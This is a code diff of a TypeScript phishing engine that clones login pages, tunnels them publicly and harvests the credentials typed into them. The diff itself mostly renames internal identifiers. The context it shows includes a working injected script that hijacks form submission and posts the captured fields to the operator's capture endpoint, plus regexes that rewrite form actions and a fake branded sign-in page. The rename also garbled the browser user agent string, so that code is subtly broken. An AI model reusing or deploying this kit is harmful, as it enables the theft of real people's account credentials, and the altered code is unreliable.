@@ -2,7 +2,7 @@
  * phish.ts — `/phish`: clone a login page, serve it, tunnel it, harvest credentials.
  *
  * What this module is: the engine behind the /phish command (ported from
- * zimzilla/phish.py). It is an engine, not a playbook — a phishing page has to
+ * andy/phish.py). It is an engine, not a playbook — a phishing page has to
  * stay up after the turn that launched it, and captured credentials have to
  * land in the UI in real time rather than in an end-of-run report. So this
  * module owns the whole life of a campaign: validate target → campaign dir
@@ -48,7 +48,7 @@ const PASS_KEYS = [
 // Browser-looking UA. A handful of login pages 403 a bare fetch UA and we
 // would rather clone the real page than fall back to the template.
 const UA =
-  'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 ' +
+  'Moandy/5.0 (X11; Linux x86_64) AppleWebKit/537.36 ' +
   '(KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36';
 
 // Extra headers a real Chrome navigation sends. Facebook (and a few other
@@ -355,29 +355,29 @@ function injectBase(htmlText: string, origin: string): string {
   return tag + '\n' + htmlText;
 }
 
-// The `/__zim_*` endpoint names and the `zimHooked` dataset key are this
+// The `/__andy_*` endpoint names and the `andyHooked` dataset key are this
 // module's own self-contained wire identifiers (page → our server); they are
 // kept verbatim from the Python original — nothing else knows or parses them,
-// and the rename rules cover only zimzilla/ZimZilla/ZIMZILLA.
+// and the rename rules cover only andy/Andy/ANDY.
 const CAPTURE_HOOK = `
 <script>
 (function () {
   function send(fd) {
     try {
-      fetch("/__zim_capture", {method: "POST", body: fd, credentials: "same-origin"});
+      fetch("/__andy_capture", {method: "POST", body: fd, credentials: "same-origin"});
     } catch (e) {}
   }
   function hijack(form) {
-    if (!form || form.dataset.zimHooked) return;
-    form.dataset.zimHooked = "1";
-    form.setAttribute("action", "/__zim_capture");
+    if (!form || form.dataset.andyHooked) return;
+    form.dataset.andyHooked = "1";
+    form.setAttribute("action", "/__andy_capture");
     form.setAttribute("method", "POST");
     form.removeAttribute("target");
     form.addEventListener("submit", function (ev) {
       ev.preventDefault();
       ev.stopPropagation();
       try { send(new FormData(form)); } catch (e) {}
-      window.location = "/__zim_thanks";
+      window.location = "/__andy_thanks";
       return false;
     }, true);
   }
@@ -392,7 +392,7 @@ const CAPTURE_HOOK = `
     ev.stopPropagation();
     hijack(form);
     try { send(new FormData(form)); } catch (e) {}
-    window.location = "/__zim_thanks";
+    window.location = "/__andy_thanks";
     return false;
   }, true);
   if (window.MutationObserver) {
@@ -417,7 +417,7 @@ function injectCaptureHook(htmlText: string): string {
    * Google / Microsoft / a lot of modern logins have no `<form>` in the
    * first HTML. Rewriting static tags is not enough — we have to hook
    * submit (and any form that appears later) so the clone still harvests. */
-  if (htmlText.includes('zimHooked')) return htmlText;
+  if (htmlText.includes('andyHooked')) return htmlText;
   if (/<\/body\s*>/i.test(htmlText)) {
     return htmlText.replace(/<\/body\s*>/i, () => CAPTURE_HOOK + '</body>');
   }
@@ -438,7 +438,7 @@ function rewriteForms(htmlText: string): string {
     t = t.replace(/\starget\s*=\s*("[^"]*"|'[^']*'|[^\s>]+)/gi, '');
     t = t.replace(/\sonsubmit\s*=\s*("[^"]*"|'[^']*'|[^\s>]+)/gi, '');
     // Insert just before the closing `>`.
-    return t.slice(0, -1) + ' action="/__zim_capture" method="POST">';
+    return t.slice(0, -1) + ' action="/__andy_capture" method="POST">';
   });
 }
 
@@ -488,7 +488,7 @@ function brandedTemplate(host: string): string {
 </style>
 </head>
 <body>
-  <form class="card" action="/__zim_capture" method="POST">
+  <form class="card" action="/__andy_capture" method="POST">
     <div class="mark">${safe.slice(0, 1).toUpperCase()}</div>
     <h1>Sign in to ${safe}</h1>
     <p class="sub">Use your ${safe} account to continue.</p>
@@ -795,7 +795,7 @@ export function pagekiteBin(): string | null {
 }
 
 export function pagekiteName(): string {
-  /** Public kite name, e.g. `zim.pagekite.me`.
+  /** Public kite name, e.g. `andy.pagekite.me`.
    *
    * Looked up in order: `PAGEKITE_NAME`, then `~/.andy/pagekite.name`.
    * Empty means PageKite cannot fly unattended — `openTunnel` will skip it
@@ -1173,7 +1173,7 @@ export class Campaign {
     const u = req.url ? new URL(req.url, 'http://localhost') : null;
     const pathname = u?.pathname ?? '/';
     if (req.method === 'GET') {
-      if (pathname === '/__zim_thanks') {
+      if (pathname === '/__andy_thanks') {
         sendRes(res, 200, this.thanksHtml);
         return;
       }
